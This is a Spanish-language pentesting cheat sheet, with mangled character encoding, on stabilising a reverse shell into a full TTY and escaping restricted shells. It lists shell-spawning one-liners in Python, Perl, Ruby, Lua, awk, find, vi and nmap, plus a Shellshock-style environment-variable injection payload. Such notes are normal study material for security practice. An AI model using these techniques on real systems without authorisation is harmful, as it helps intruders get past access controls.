# ğŸ–¥ï¸ Tratamiento de la TTY + Restricted Shell

---

## ğŸ“‹ Ãndice

1. [Â¿QuÃ© es la TTY?](#quÃ©-es-la-tty)
2. [Â¿Por quÃ© se hace el tratamiento de la TTY?](#por-quÃ©-se-hace-el-tratamiento-de-la-tty)
3. [Formas de tratar la TTY](#formas-de-tratar-la-tty)
    - [MÃ©todo 1ï¸âƒ£: `script /dev/null -c bash`](#mÃ©todo-1ï¸âƒ£-script-devnull--c-bash)
    - [MÃ©todo 2ï¸âƒ£: Python, Perl, Ruby, Lua, Vi, Nmap, etc.](#mÃ©todo-2ï¸âƒ£-python-perl-ruby-lua-vi-nmap-etc)
4. [Â¿QuÃ© es una Restricted Shell?](#quÃ©-es-una-restricted-shell)
5. [CÃ³mo escapar de una Restricted Shell](#cÃ³mo-escapar-de-una-restricted-shell)
6. [Resumen](#resumen)

---

## â“ Â¿QuÃ© es la TTY?

Cuando logramos obtener una **reverse shell**, recibimos una **terminal mÃ­nima o limitada**.  
Esta terminal bÃ¡sica no tiene todas las capacidades de una terminal interactiva real (TTY).

ğŸ‘‰ La **TTY (Teletype Terminal)** es la interfaz de entrada/salida entre el sistema y el usuario.

Al recibir una reverse shell, normalmente obtenemos una **pseudo-terminal** sin TTY completa.  
Por eso es necesario "tratarla" para convertirla en una shell mÃ¡s funcional.

---

## â“ Â¿Por quÃ© se hace el tratamiento de la TTY?

El objetivo es lograr una **TTY interactiva**, es decir, convertir una shell limitada en una shell completa que nos permita:

- âœ… Usar comandos avanzados (`su`, `nano`, `top`, etc.)
- âœ… Manejar atajos de teclado (`Ctrl+C`, `Ctrl+Z`, `Ctrl+D`)
- âœ… Mejorar la estabilidad y experiencia de la shell
- âœ… Tener autocompletado, ediciÃ³n de lÃ­nea, historial de comandos, etc.

---

## ğŸ”§ Formas de tratar la TTY

---

### MÃ©todo 1ï¸âƒ£: `script /dev/null -c bash`

Este mÃ©todo funciona en sistemas donde estÃ¡ disponible el comando `script`.

```bash
script /dev/null -c bash
```
Luego:

```
# Suspender la shell temporalmente
Ctrl + Z

# Ajustar la terminal actual
stty raw -echo; fg

# Resetear la terminal
reset xterm

# Exportar variables para mejorar compatibilidad
export SHELL=bash
export TERM=xterm
```
MÃ©todo 2ï¸âƒ£: Python, Perl, Ruby, Lua, Vi, Nmap, etc.
Si script no funciona, puedes intentar cualquiera de estos mÃ©todos alternativos:
```
# Python (muy comÃºn)
python -c 'import pty; pty.spawn("/bin/bash")'

# Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Bash interactivo
echo os.system('/bin/bash')
/bin/sh -i

# Otro uso de script
script -qc /bin/bash /dev/null

# Perl
perl -e 'exec "/bin/sh";'

# Ruby
ruby -e 'exec "/bin/sh"'

# Lua
lua -e 'os.execute("/bin/sh")'

# IRB (Ruby shell)
irb
exec "/bin/sh"

# Vi (si puedes abrirlo)
vi
# Dentro de vi:
:!bash
# o
:set shell=/bin/bash | :shell

# Nmap (si tienes --interactive)
nmap --interactive
nmap> !sh
```
Restricted Shell y cÃ³mo escapar de ella (con ejemplos)
Una restricted shell (shell restringida) es un entorno limitado de lÃ­nea de comandos que restringe funciones bÃ¡sicas para evitar que el usuario pueda salir del entorno controlado o ejecutar comandos peligrosos.

Por ejemplo, en una restricted shell comÃºnmente:

No puedes usar cd para cambiar de directorio.

No puedes usar barras / en comandos para evitar ejecutar shells externas.

No puedes redirigir la salida con >, >> o entrada con <.

No puedes modificar variables de entorno.

EstÃ¡s limitado a ciertos comandos permitidos.

Estas restricciones buscan limitar el control del usuario para proteger el sistema.
CÃ³mo escapar de una restricted shell
1) Invocar otra shell directamente
Si tienes acceso a shells comunes, intenta ejecutar alguna de estas:
```
/bin/bash  
/bin/sh  
/bin/zsh  
/bin/ksh  
```
2) Usar comandos que ejecutan shell internamente
Ejemplos de comandos que pueden invocar una shell dentro de ellos:
```
awk 'BEGIN {system("/bin/sh")}'  
perl -e 'exec "/bin/sh";'  
python -c 'import os; os.system("/bin/sh")'  
```
3) Crear y ejecutar scripts temporales
Si tienes permisos para crear archivos, puedes hacer:
```
echo 'bash' > /tmp/shell.sh  
chmod +x /tmp/shell.sh  
/tmp/shell.sh  
```
4) Explorar variables de entorno y funciones shell
En algunas configuraciones vulnerables:
```
env x='() { :;}; /bin/bash' bash -c "echo escaped"  
```
5) Usar editores para ejecutar comandos
En vim o vi escribe:
```
:! /bin/sh  
```
En nano presiona:
```
Ctrl + R  
Ctrl + X  
```
6) Usar otros comandos con capacidad para ejecutar comandos arbitrarios
Por ejemplo:
```
find . -exec /bin/sh \;  
ruby -e 'exec "/bin/sh"'  
```
Resumen
Las restricted shells bloquean comandos comunes como cd, redirecciones (>, <), ejecuciÃ³n de comandos externos con /, etc.

Para escapar, intenta invocar shells comunes o usar comandos que ejecutan shells internamente.

Usa editores o comandos que permiten ejecutar shells.

Explora vulnerabilidades en variables de entorno.



